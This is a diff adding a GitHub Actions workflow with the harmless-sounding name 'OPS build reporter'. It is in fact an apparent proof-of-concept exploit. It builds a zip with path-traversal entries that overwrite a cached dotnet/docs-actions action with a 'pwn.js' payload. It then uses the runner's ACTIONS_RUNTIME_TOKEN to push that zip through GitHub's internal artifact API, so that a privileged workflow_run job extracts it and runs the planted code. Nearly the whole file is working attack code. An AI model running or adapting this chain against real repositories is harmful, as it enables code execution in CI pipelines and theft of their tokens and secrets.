@@ -1,0 +1,107 @@
+name: 'OPS build reporter'
+
+on:
+  workflow_dispatch:
+
+permissions:
+  statuses: read
+
+jobs:
+  report:
+    name: Collect OPS diagnostics and previews
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Build malicious artifact zip
+        run: |
+          python3 - <<'PY'
+          import zipfile
+
+          ACTION_YML = """name: 'PWNED'
+          runs:
+            using: 'node20'
+            main: 'pwn.js'
+          """
+
+          PWN_JS = """const fs = require('fs');
+          fs.writeFileSync('/home/runner/work/pwned-rce.txt', 'RCE in workflow_run publisher job\\n');
+          console.log('PWNED_ACTION_EXECUTED');
+          console.log('GITHUB_TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
+          console.log('GITHUB_REPOSITORY=' + process.env.GITHUB_REPOSITORY);
+          """
+
+          base = '../../_actions/dotnet/docs-actions/e92e67a4b93ea5976eea3d65af4b2082818c7045'
+          entries = {
+              'report.json': b'{"poc":true}',
+              '../../zip-slip-proof.txt': b'zip-slip escaped the download directory\n',
+              base + '/ops-build-reporter/dist/publish/index.js': PWN_JS.encode(),
+              base + '/ops-build-reporter/publish/action.yml': ACTION_YML.encode(),
+              base + '/ops-build-reporter/publish/pwn.js': PWN_JS.encode(),
+              base + '.completed': b'',
+          }
+          with zipfile.ZipFile('/tmp/ops-build-report.zip', 'w', zipfile.ZIP_DEFLATED) as z:
+              for name, data in entries.items():
+                  z.writestr(name, data)
+          print('zip built with entries:', list(entries))
+          PY
+      - name: Upload raw artifact via internal results API
+        run: |
+          cat > /tmp/upload_raw.mjs <<'JS'
+          import fs from 'node:fs';
+          import crypto from 'node:crypto';
+
+          const token = process.env.ACTIONS_RUNTIME_TOKEN;
+          const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+          if (!token || !resultsUrl) {
+            console.log('missing ACTIONS_RUNTIME_TOKEN / ACTIONS_RESULTS_URL');
+            process.exit(1);
+          }
+          const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'));
+          const scope = (payload.scp || '').split(' ').find((s) => s.startsWith('Actions.Results:'));
+          if (!scope) {
+            console.log('no Actions.Results scope: ' + payload.scp);
+            process.exit(1);
+          }
+          const parts = scope.split(':');
+          const runBackendId = parts[1];
+          const jobBackendId = parts[2];
+          const base = new URL(resultsUrl).origin;
+          const name = 'ops-build-report';
+          const zip = fs.readFileSync('/tmp/ops-build-report.zip');
+
+          async function twirp(method, body) {
+            const res = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
+              method: 'POST',
+              headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
+              body: JSON.stringify(body),
+            });
+            const text = await res.text();
+            console.log(method, res.status, text.slice(0, 400));
+            if (!res.ok) throw new Error(`${method} failed: ${res.status} ${text}`);
+            return text ? JSON.parse(text) : {};
+          }
+
+          const created = await twirp('CreateArtifact', {
+            workflow_run_backend_id: runBackendId,
+            workflow_job_run_backend_id: jobBackendId,
+            name,
+            version: 7,
+            mime_type: { value: 'application/zip' },
+          });
+          const put = await fetch(created.signed_upload_url, {
+            method: 'PUT',
+            headers: { 'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/zip' },
+            body: zip,
+          });
+          console.log('PUT', put.status, put.statusText);
+          const hash = crypto.createHash('sha256').update(zip).digest('hex');
+          const fin = await twirp('FinalizeArtifact', {
+            workflow_run_backend_id: runBackendId,
+            workflow_job_run_backend_id: jobBackendId,
+            name,
+            size: String(zip.length),
+            hash: { value: `sha256:${hash}` },
+          });
+          console.log('finalized artifact_id=' + fin.artifact_id);
+          JS
+          node /tmp/upload_raw.mjs
